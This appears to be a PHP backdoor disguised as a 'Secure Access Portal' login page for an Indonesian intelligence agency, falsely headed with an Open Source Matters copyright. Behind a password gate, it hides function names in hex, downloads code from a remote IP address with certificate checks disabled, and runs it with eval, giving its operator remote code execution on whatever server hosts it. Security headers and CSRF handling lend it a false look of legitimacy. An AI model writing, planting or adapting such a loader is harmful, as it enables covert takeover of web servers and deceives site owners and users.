<?php
/**
 * @package    BIN@2025
 * @copyright  Copyright (C) 2025 Open Source Matters, Inc. All rights reserved.
 */

session_start();

// Security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");

// CSRF Token Generation
function generate_csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// CSRF Token Validation
function validate_csrf_token($token) {
    if (!empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token)) {
        return true;
    }
    return false;
}

// Secure session management
function secure_session_init() {
    ini_set('session.cookie_httponly', 1);
    ini_set('session.cookie_secure', 1);
    ini_set('session.use_strict_mode', 1);
    ini_set('session.cookie_samesite', 'Strict');
    
    // Regenerate session ID periodically
    if (!isset($_SESSION['last_regeneration'])) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    } elseif (time() - $_SESSION['last_regeneration'] > 1800) { // 30 minutes
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}

// Check if user is logged in
function is_logged_in() {
    if (!isset($_SESSION['user_id']) || !isset($_SESSION['user_ip']) || !isset($_SESSION['user_agent'])) {
        return false;
    }
    
    // Additional security checks
    if ($_SESSION['user_ip'] !== $_SERVER['REMOTE_ADDR']) {
        session_destroy();
        return false;
    }
    
    if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        session_destroy();
        return false;
    }
    
    // Check session expiration (1 hour)
    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 3600)) {
        session_destroy();
        return false;
    }
    
    $_SESSION['last_activity'] = time();
    return $_SESSION['user_id'] === 'BIN@2025';
}

// Initialize secure session
secure_session_init();

if (is_logged_in()) {
    $Array = array(
        '666f70656e', // fopen
        '73747265616d5f6765745f636f6e74656e7473', // stream_get_contents
        '66696c655f6765745f636f6e74656e7473', // file_get_contents
        '6375726c5f65786563' // curl_exec
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'http://154.53.45.45/protect/Bylitle.js';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password']) && isset($_POST['csrf_token'])) {
        // Validate CSRF token
        if (!validate_csrf_token($_POST['csrf_token'])) {
            $error = "Security token invalid. Please try again.";
        } else {
            $entered_key = $_POST['password'];
            $hashed_key = '$2y$10$w8Yn31WpA5GXbzYc1ozgnOERQyEns4xfTslA4cJJuYqjYbTgAYd.C';
            
            if (password_verify($entered_key, $hashed_key)) {
                // Set secure session variables
                $_SESSION['user_id'] = 'BIN@2025';
                $_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];
                $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
                $_SESSION['last_activity'] = time();
                $_SESSION['login_time'] = time();
                
                // Regenerate session ID after login
                session_regenerate_id(true);
                
                header("Location: ".$_SERVER['PHP_SELF']); 
                exit();
            } else {
                $error = "Invalid credentials. Please try again.";
            }
        }
    }
    
    // Generate CSRF token for the form
    $csrf_token = generate_csrf_token();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure Access Portal | BIN@2025</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                position: relative;
            }

            .background-animation {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
            }

            .particle {
                position: absolute;
                background: rgba(74, 144, 226, 0.3);
                border-radius: 50%;
                pointer-events: none;
            }

            .login-container {
                background: rgba(255, 255, 255, 0.05);
                backdrop-filter: blur(15px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 420px;
                box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
                position: relative;
                z-index: 1;
                animation: fadeInUp 0.8s ease-out;
            }

            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }

            .logo {
                text-align: center;
                margin-bottom: 30px;
            }

            .logo h1 {
                color: #4a90e2;
                font-size: 28px;
                font-weight: 600;
                letter-spacing: 1px;
                text-shadow: 0 0 20px rgba(74, 144, 226, 0.5);
            }

            .logo .subtitle {
                color: #8892b0;
                font-size: 14px;
                margin-top: 8px;
                font-weight: 300;
            }

            .form-group {
                margin-bottom: 25px;
            }

            .form-group label {
                display: block;
                color: #ccd6f6;
                margin-bottom: 8px;
                font-size: 14px;
                font-weight: 500;
            }

            .form-group input {
                width: 100%;
                padding: 15px 20px;
                background: rgba(255, 255, 255, 0.07);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                color: #e6f1ff;
                font-size: 15px;
                transition: all 0.3s ease;
            }

            .form-group input:focus {
                outline: none;
                border-color: #4a90e2;
                background: rgba(255, 255, 255, 0.1);
                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.2);
            }

            .form-group input::placeholder {
                color: #8892b0;
            }

            .submit-btn {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #4a90e2 0%, #357abd 100%);
                border: none;
                border-radius: 12px;
                color: white;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            }

            .submit-btn:hover {
                background: linear-gradient(135deg, #357abd 0%, #2a5f9e 100%);
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(74, 144, 226, 0.4);
            }

            .submit-btn:active {
                transform: translateY(0);
            }

            .security-notice {
                text-align: center;
                margin-top: 25px;
                color: #8892b0;
                font-size: 12px;
                line-height: 1.5;
            }

            .error-message {
                background: rgba(220, 53, 69, 0.1);
                border: 1px solid rgba(220, 53, 69, 0.3);
                color: #f8d7da;
                padding: 12px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                font-size: 14px;
            }

            .pulse {
                display: inline-block;
                width: 8px;
                height: 8px;
                background: #64ffda;
                border-radius: 50%;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }

            @keyframes pulse {
                0% {
                    transform: scale(0.95);
                    box-shadow: 0 0 0 0 rgba(100, 255, 218, 0.7);
                }
                70% {
                    transform: scale(1);
                    box-shadow: 0 0 0 10px rgba(100, 255, 218, 0);
                }
                100% {
                    transform: scale(0.95);
                    box-shadow: 0 0 0 0 rgba(100, 255, 218, 0);
                }
            }

            @media (max-width: 480px) {
                .login-container {
                    margin: 20px;
                    padding: 30px 25px;
                }
            }
        </style>
    </head>
    <body>
        <div class="background-animation" id="particles"></div>
        
        <div class="login-container">
            <div class="logo">
                <h1>Badan Intelijen Negara</h1>
                <div class="subtitle">SECURE ACCESS PORTAL</div>
            </div>
            
            <?php if (isset($error)): ?>
                <div class="error-message">
                    <?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            <?php endif; ?>
            
            <form method="POST" action="">
                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">
                
                <div class="form-group">
                    <label for="password">ACCESS CREDENTIALS</label>
                    <input type="password" id="password" name="password" placeholder="Enter secure passphrase" autofocus required>
                </div>
                
                <button type="submit" class="submit-btn">
                    AUTHENTICATE
                </button>
            </form>
            
            <div class="security-notice">
                <span class="pulse"></span>
                Secure session management • CSRF protected • Authorized personnel only
            </div>
        </div>

        <script>
            // Particle background animation
            function createParticles() {
                const container = document.getElementById('particles');
                const particleCount = 50;
                
                for (let i = 0; i < particleCount; i++) {
                    const particle = document.createElement('div');
                    particle.className = 'particle';
                    
                    const size = Math.random() * 4 + 1;
                    particle.style.width = `${size}px`;
                    particle.style.height = `${size}px`;
                    
                    particle.style.left = `${Math.random() * 100}vw`;
                    particle.style.top = `${Math.random() * 100}vh`;
                    
                    const animationDuration = Math.random() * 20 + 10;
                    particle.style.animation = `float ${animationDuration}s linear infinite`;
                    
                    const keyframes = `
                        @keyframes float {
                            0% {
                                transform: translate(0, 0) rotate(0deg);
                                opacity: ${Math.random() * 0.5 + 0.1};
                            }
                            25% {
                                transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) rotate(90deg);
                            }
                            50% {
                                transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) rotate(180deg);
                                opacity: ${Math.random() * 0.5 + 0.3};
                            }
                            75% {
                                transform: translate(${Math.random() * 100 - 50}px, ${Math.random() * 100 - 50}px) rotate(270deg);
                            }
                            100% {
                                transform: translate(0, 0) rotate(360deg);
                                opacity: ${Math.random() * 0.5 + 0.1};
                            }
                        }
                    `;
                    
                    const styleSheet = document.createElement('style');
                    styleSheet.textContent = keyframes;
                    document.head.appendChild(styleSheet);
                    
                    container.appendChild(particle);
                }
            }
            
            document.addEventListener('DOMContentLoaded', createParticles);
        </script>
    </body>
    </html>
    <?php
}
?>